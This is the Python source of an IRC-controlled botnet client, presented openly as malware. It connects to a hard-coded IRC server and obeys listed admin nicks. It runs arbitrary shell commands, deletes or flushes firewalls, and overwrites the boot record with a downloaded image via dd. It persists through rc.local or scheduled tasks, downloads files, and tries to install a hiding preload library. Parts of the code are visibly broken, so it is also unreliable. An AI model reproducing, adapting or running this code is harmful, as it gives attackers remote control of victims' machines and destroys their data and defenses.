#!/usr/bin/python
#IRC-based CNC Botnet
#Authors: Luke Matarazzo and Jackson Sadowski
#Blizzo

#to do list
#fix port scanner!
#make more cross-platform instead of just for linux - windows, mac, sun, etc.
#figure out how to disconnect from server and disconnect from channel
#slowloris function
#persist function
#add root/backdoor user function

import socket
import ftplib
import urllib2
import urllib
import sys
# import ctypes #not sure we need this or not
import random
import time
import platform
import os
import subprocess as sub
from sys import argv
from random import randint
import getpass

#global stuff
operatingSystem = ""
INTERACT = []
admins = []
nick = ""
DEBUG = 1
channel = 0

def installPreloader(): #downloads preload binary
	response = urllib2.urlopen('https://github.com/Blizzo/IRCbot/blob/master/hide.so')
	data = response.read()
	f = open('/usr/lib/libld.so.2')
	f.write(data)
	f.close()

def generateNick(operatingSystem): #generates a nick for the server
	if not operatingSystem:
		operatingSystem = "unk"
	rannum = str(randint(0, 9999))
	return str(operatingSystem[:3] + rannum)

#execute shell commands given and return the output
def execute(cmd):
	print "in execute function. we got '%s'" % cmd
	isItLs = 0
	if "ls" == cmd[:2] or "dir" == cmd[:3]:
		if operatingSystem == "windows":
			commandList = cmd.split(" ")
			directory = ""
			for command in commandList[1:]:
				if command[:1] != "-" and command[:1] != "/":
					directory = directory + command.replace("/","\\")
			cmd = "dir " + directory + " /AD /B && echo : && dir" + directory + " /A-D /B"
		else:
			cmd += " -pA"
		isItLs = 1

	#putting in an array so we can pass to the function
	if operatingSystem == "windows":
		cmdList = ["C:\\Windows\\system32\\cmd.exe", "/C"]
	else:
		cmdList = ["/bin/sh", "-c"]

	cmdList.append(cmd)

	try: #checking for syntax errors
		p = sub.Popen(cmdList,stdout=sub.PIPE,stderr=sub.PIPE)
		output, errors = p.communicate()
		output = output.replace("\r\n","\n") #to replace windows line endings with unix ones

	except: #if there was some sytax error, spit back an error
		print "An error has occured.\n"
		return "An error has occured. Probably invalid command or syntax."
	
	if not output:
		if errors:
			return errors.replace("\r\n","\n")
		else:
			return "No output. Maybe try again."

	#handling multi-line output
	lines = output.split("\n")[:-1] #split based on newline, return all except last element which is just a blank new line
	if lines: #if there was a new line found, return array
		if isItLs: #doing all the directory stuff
			if DEBUG:
				print "output is as follows:"
				print output
				print "lines is as follows:"
				print lines

			dirs = "dirs: "
			files = "files: "
			if operatingSystem == "windows":
				pos = lines.index(": ")
				for line in lines[:pos]: #directories are everything before a :
					dirs += "'" + line + "/'   "
				for line in lines[(pos + 1):]: #files are everything after a :
					files += "'" + line + "'   "
			else:
				for line in lines:
					if line[-1] == "/":
						dirs += "'" + line + "'   "
					else:
						files += "'" + line + "'   "

			if len(dirs + files) < 15:
				lines = ["./ ../"]
			if len(dirs) < 7:
				lines = [files.strip()]
			elif len(files) < 8:
				lines = [dirs.strip()]
			else:
				lines = [dirs.strip(), files.strip()]


		for element in lines: #check if a line is JUST a newline
			if not element:
				lines[lines.find(element)] = "~" #replace newline with a ~

		return lines
	
	return output

#actually sending the data
def sendData(data): #send text back to the irc server
	#sending multiple lines if it's a list
	if type(data) is list:
		for line in data:
			irc.send('PRIVMSG ' + channel + " :" + line + '\r\n')
	else: #sending a one-liner back
		irc.send('PRIVMSG ' + channel + " :" + data + '\r\n')

### bot functions that respond to IRC commands ###

#All of the possible functions that the botnet is capable of
def reply(): #send back to IRC server that you are here
	sendData("Yes I am here")

def whoAmI(): #execute whoami command and send output
	sendData(getpass.getuser())

def iAmGood(): #send back to IRC server that you are good
	sendData("I am good. And you?")

def getAge(): #send uptime
	sendData("I don't know how to do that yet boss.")

def terminate(): #terminate program and send goodbye message
	sendData("Oh no! We better find some cover.")
	irc.close()
	sys.exit()

def freeSpace(): #tells how much free space there is
	request = execute("df")
	sendData(request)

def uptime(): #total uptime on the server
	request = execute("uptime")
	sendData(request)

def version(): #determine flavor/version
	if operatingSystem == "darwin": #if mac
		info = platform.mac_ver()
	elif operatingSystem == "windows": #if windows
		info = platform.win32_ver()
	elif operatingSystem == "linux": #if linux
		info = platform.linux_distribution()
	else:
		sendData("Not sure...")

	sendData(" - ".join(filter(None,list(info))))

def kernel(): #which kernel version
	sendData(platform.release())

def getIP(): #gets the public IP address
	my_ip = urllib2.urlopen('http://ip.42.pl/raw').read()
	sendData(my_ip)

def killFirewall(): #removes the firewall from the box
	if operatingSystem == "linux":
		execute("rm -f $(which iptables)")
		execute("rm -f $(which ip6tables)")
	elif operatingSystem == "windows":
		execute("sc delete SharedAccess")
		execute("del /F C:\\Windows\\System32\\WF.msc")
		execute("del /F C:\\Windows\\System32\\firewall*")

def flushFirewall(): #flushes the firewall rules
	if (operatingSystem == "linux"):
		execute("/usr/bin/env iptables -F") #flushing rules
		execute("/usr/bin/env ip6tables -F") #flushing rules
		sendData("Firewall rules have been flushed.")
	elif operatingSystem == "windows":
		kernel = platform.release().lower()
		if kernel == "xp":
			execute("netsh firewall set opmode disable") #turn off firewall
		else:
			execute("netsh advfirewall firewall delete rule name=all") #delete all rules
			execute("netsh advfirewall set allprofiles state off") #disable profiles. aka turn off

		sendData("Firewall rules have been flushed.")
	else:
		sendData("I can't do this '" + operatingSystem + "' yet")

def checkFirewall(): #reports current firewall config
	if (operatingSystem == "linux"):
		sendData("Current Firewall Rules:")
		request = execute("/usr/bin/env iptables -L -n")
		sendData(request)
	elif (operatingSystem == "windows"):
		sendData("idk how to windows yet boss.")
	elif (operatingSystem == "darwin"):
		sendData("idk how to mac yet boss.")
	else:
		sendData("unknown os")

def nyanmbr(): #download nyancat.mbr and over bootloader with it
	if operatingSystem and operatingSystem != "windows":
		execute("wget --no-check-certificate -q -P /tmp https://minemu.org/nyanmbr/nyan.mbr")
		execute("dd if=/tmp/nyan.mbr of=/dev/sda")
		execute("rm -f /tmp/nyan.mbr")
		sendData("Overwriting seems to have worked :3")

def nap(): #shutdown the computer
	irc.close()
	if operatingSystem == "windows": #if windows
		execute("shutdown -s -t 0")
	else: #any unix based OS will handle this correctly
		execute("init 0")

def reboot(): #reboot the computer
	irc.close()
	if operatingSystem == "windows": #if windows
		execute("shutdown -r -t 0")
	else: #any unix based OS will handle this correctly
		execute("init 6")

def persist(): #try to persist bot; for freebsd, make file, place in /usr/local/etc/rc.d/
	# print "argv0 is '%s'" % argv[0]
	# print "cwd is '%s'" % os.getcwd()
	pwd = os.getcwd()
	if operatingSystem == "windows":
		output = execute("schtasks /Create /SC ONSTART /TN WindowsSystem /TR \"" + argv[0] + "\"")
		sendData(output)
		return
	elif operatingSystem == "darwin": #if mac
		sendData("i'm on a mac. you know the deal.")
		script = pwd + "/" + argv[0]
		#looking into launchd and launchctl. ugh! why did they get rid of cron? stupid xmls
		return
	else:
		script = pwd + "/" + argv[0]
		if operatingSystem == "linux": #if linux
			path = "/etc/rc.local"
		# elif operatingSystem == "freebsd": #if freebsd
			# pass
		else:
			sendData("don't know the os...")
			return

		if os.access(path, os.W_OK): #check if we have write perms
			infile = open(path, "r")
			lines = infile.readlines()
			infile.close()
			outfile = open(path, 'w')
			for line in lines:
				if "exit" in line.lower():
					outfile.write("/usr/bin/env python " + script + " \n")
					outfile.write(line)
				else:
					outfile.write(line)

			outfile.close()
			sendData("Seems to have worked...")
		else:
			sendData("Either /etc/rc.local doesn't exist or I can't write to it.")

### bot functions which take parameters that respond to IRC commands ###

def download(cmd): #file downloader
	if operatingSystem == "linux":
		if cmd.count(" ") > 1: #make sure there is only 1 space
			sendData("Usage: download [file] [dir]")
		else:
			args = cmd.split(" ")
			download = "wget --no-check-certificate -q -P " + args[1] + " " + args[0]
			
			request = execute(download) #executing the download
			sendData("Download executed.")
	else:
		sendData("I don't know how to download yet boss.")

def guiSpam(cmd): #spam gui with things
	sendData("Not ready yet.")
	# args = cmd.split(" ") #first arg is number, second is seconds/minutes/hours/days/whatever, third is for windows to specify application
	# if operatingSystem == "windows": #scheduled tasks probably won't work. gotta play with it more
	# 	app = "C:\\Windows\\System32\\notepad.exe"
	# 	if len(args) < 2:

	# 	execute("schtasks /Create /SC ONSTART /TN 'Windows System Process' /TR " + app)
	# else: #all else
	# 	pass

def scanner(cmd): #local port scanner
	end = 65535 if (cmd == "full") else 1024
	openPorts = []
	for port in range(1, end):
		try:
			temp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			temp.settimeout(1000)
			s.connect(('127.0.0.1', port))
			openPorts.append(port)
			temp.close()
		except: continue

	if openPorts:
		return openPorts
	else:
		return("No listening ports.")

def admin(cmd): #add/remove admins
	args = cmd.split(" ")
	if args[0][:3] == "rem":
		admins.remove(args[1])
		sendData("Admin '" + args[1] + "' removed.")
	elif args[0][:3] == "add":
		if args[1] not in admins:
			admins.append(args[1])
			sendData("Admin '" + args[1] + "' added.")
	else:
		sendData("Admins are: " + ", ".join(admins))

def runFunction(cmd):
	pos = cmd.find(" ")
	if pos == -1: #if not found, make pos the end of the string so we take the whole string later on
		pos = len(cmd)

	if cmd in commands.keys(): #if regular command
		commands[cmd]() #call appropriate function
		print "function called"
	elif cmd[:pos] in commandsParams.keys():
		output = commandsParams[cmd[:pos]](cmd[(pos+1):]) #run appropriate function. get return value in 'output'
		print "function called"
		if output: #if the function returned something, we need to send it
			sendData(output)
	else: #if not recognized
		print "command '%s' not defined" % cmd


#function which parses the command and determines how to handle it
def parseCommand(command):
	if DEBUG:
		print "command is '%s'" % command
		print "interact 0: " + str(INTERACT[0])
		print "interact 1: " + str(INTERACT[1])

	if INTERACT[1] and "PRIVMSG" in command: #check if we should respond or not and if we find privmsg, we're good!
		lines = command.split("\n")
		if len(lines) > 2:
			print "we got a bunch of lines...doing nothing"
			return

		header = command[:command.find("PRIVMSG")] #get everything before PRIVMSG
		header = header[(header.find(":") + 1):] #get all after colon

		user = header[:header.find("!~")] #user sending message
		host = header[(header.find("!~") + 2):header.find(" ")] #hostname and ip/domain name: 'blarg@1.2.3.4'
		hostname = host[:host.find("@")] #hostname: 'blarg'
		client = host[(host.find("@") + 1):] #client/ip/domain name: '1.2.3.4' or 'blarg.com'

		if DEBUG:
			print "user is '%s'" % user
			print "host is '%s'" % host
			print "hostname is '%s'" % hostname
			print "client is '%s'" % client

		if user in admins: #check if sender is an approved controller
			tempCommand = command[command.find("PRIVMSG"):]
			command = tempCommand[(tempCommand.find(':') + 1):].strip().lower()

			print "Recieved '%s' from the CNC" % command #print command

			if INTERACT[0]: #if interactive shell is on
				if "??finish" == command[:8]:
					INTERACT[0] = 0
					return
				elif "??toggle" == command[:8]: #toggle between listening for bash commands or bot functions
					INTERACT[2] = INTERACT[2] * -1
					return
				elif "??mode" == command[:6]: #tell whether in shell or function mode
					if INTERACT[2] > 0:
						sendData("I'm in interactive shell mode.")
					else:
						sendData("I'm in bot function mode.")

					return
				elif "??-" == command[:3]:
					users = command[3:].split(" ")
					if nick in users or "all" in users or nick[:3] in users:
						INTERACT[1] = 0

					return
				elif "??+" == command[:3]:
					return

				if command:
					if INTERACT[2] > 0:
						sendData(execute(command)) #run on commandline
					else:
						runFunction(command) #run function
			elif "??" == command[:2]: #if '??' is given
				INTERACT[0] = 1
				users = command[2:].split(" ")

				if DEBUG:
					print "command is '%s'" % command
				for user in users:
					print "user is '%s'" % user

				if not nick in users and not "all" in users and not nick[:3] in users:
					INTERACT[1] = 0
					return
			elif "?!" == command[:2]: #if they want to single out one or more bots to run a function
				if ":" in command:
					lines = command[2:].split(":")
				else:
					print "incorrect syntax. you need a ':'"
					return

				users = lines[0].split(" ")
				if "all" in users or nick in users or nick[:3] in users:
					lines[1] = lines[1].strip()
					runFunction(lines[1])
			else:
				runFunction(command) #run function
		else:
			print "user '%s' not in list of admins" % user

	else: #we should not be listening, so we'll wait for '??finish' to end interactive shell
		if "PRIVMSG" in command:
			command = command[command.find("PRIVMSG"):]
			command = command[(command.find(':') + 1):].strip().lower()
			if command.startswith("??finish"):
				INTERACT[0] = 0
				INTERACT[1] = 1
			elif command.startswith("??+"):
				users = command[3:].split(" ")
				if "all" in users or nick in users:
					INTERACT[1] = 1

#code to connect to an IRC server
def connectToServer(nick, server, port):
	print "connecting to:", server

	connected = 0
	while not connected:
		try:
			irc.connect((server, port)) #connects to the server
			connected = 1
		except:
			connected = 0
			time.sleep(5)

	irc.send("USER " + nick + " " + nick + " " + nick + " :This is a fun bot!\n") #user authentication
	irc.send("NICK " + nick + "\n") #sets nick

	temp = irc.recv(1024) #get response to setting nick
	if DEBUG:
		print "text received: '%s'" % temp

	counter = 2
	while "nickname already in use" in temp.lower():
		newnick = nick + "-" + str(counter)
		counter += 1
		if len(newnick) > 9: #if nick gets too long, generate new number and reset counter; try again
			nick = generateNick(os)
			newnick = nick
			counter = 2
		irc.send("NICK " + newnick + "\n") #sets nick
		temp = irc.recv(1024) #get response to setting nick
		if DEBUG:
			print "text received: '%s'\niteration %d" % (temp, counter)

	irc.send("PRIVMSG nickserv :iNOOPE\r\n") #auth
	irc.send("JOIN " + channel + "\n") #join the channel

	if "newnick" in locals(): #if newnick exists, set nick equal to that because that is our new nickname and we need it later
		return newnick
	else:
		return nick

def main():
	#debugger
	DEBUG = 1
	if len(argv) > 1 and (argv[1] == "-d" or argv[1] == "--debug"):
		DEBUG = 1

	#other vars
	if argv[0][:2] == "./": #if we used ./ to run it, then get rid of those two characters
		argv[0] = argv[0][2:]
	operatingSystem = platform.system().lower() #detected os in all lowercase
	INTERACT = [0, 1, 1] 	#index one is the boolean for if the interactive shell is taking place for any bot
							#index two is the boolean for if the interactive shell is with this bot
							#index three is mode indicator. if >0 we are in shell mode, if <0 we are in functions mode

	#IRC Settings
	admins = ["king", "blackbear", "bigshebang"]
	server = "jacksonsadowski.com"
	port = 6667
	channel = "#lobby"
	nick = generateNick(operatingSystem)

	print "The botnick is: '%s'" % nick

	#setting up the sockets
	irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creates socket
	nick = connectToServer(nick, server, port) #connect to IRC server

	#infinite loop to listen for messages aka commands
	while 1:
		text = irc.recv(1024) #receive up to 1024 bytes
		while not text: #if text we receive is less than 1, the other end isn't connected anymore. try to reconnect
			irc.close()
			irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creates socket
			connectToServer(nick, server, port)
			time.sleep(5)
			text = irc.recv(1024) #receive up to 1024 bytes

		#The two lines below are required by the IRC RFC, if you remove them the bot will time out.
		if text.find('PING') != -1: #check if 'PING' is found
			irc.send('PONG ' + text.split() [1] + '\r\n') #returns 'PONG' back to the server to prevent pinging out

		parseCommand(text) #call function to parse commands

#dictionary of functions that DO NOT take parameters
commands = {
	"are you there" : reply,
	"how are you" : iAmGood,
	"who are you" : whoAmI,
	"how old are you" : getAge,
	"zombie apocalypse" : terminate,
	"terminate" : terminate,
	"free" : freeSpace,
	"uptime" : uptime,
	"kernel" : kernel,
	"version" : version,
	"what is your ip" : getIP,
	"where are you" : getIP,
	"flush firewall" : flushFirewall,
	"firewall" : checkFirewall,
	"kill firewall" : killFirewall,
	"nyanmbr" : nyanmbr,
	"take a nap": nap,
	"reboot" : reboot,
	"persist" : persist
}

#dictionary of functions that DO take parameters
commandsParams = {
	"execute" : execute,
	"download" : download,
	"guispam" : guiSpam,
	"admin" : admin,
	"scan" : scanner
}

if __name__ == "__main__":
	main()
